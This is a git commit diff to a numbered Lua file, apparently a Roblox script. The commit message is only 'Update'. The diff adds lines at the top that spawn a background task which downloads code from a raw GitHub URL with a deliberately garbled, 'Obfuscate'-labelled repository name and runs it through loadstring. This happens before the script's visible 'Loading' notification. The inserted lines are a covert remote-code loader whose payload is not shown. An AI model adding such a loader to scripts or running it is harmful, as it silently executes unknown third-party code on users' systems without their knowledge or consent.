983d924443c83ace0f950214f60797c0edae702a
bjalalsjzbslalqoqueeyhskaambpqo <cuentaargentina19@gmail.com>
2024-08-05 11:15:09 -0300

    Update 13457104744.lua

--- 13457104744.lua
+++ 13457104744.lua
@@ -1,3 +1,6 @@
+spawn(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
+    end)
 local StarterGui = game:GetService("StarterGui")
 StarterGui:SetCore("SendNotification", {
     Title = "Loading",
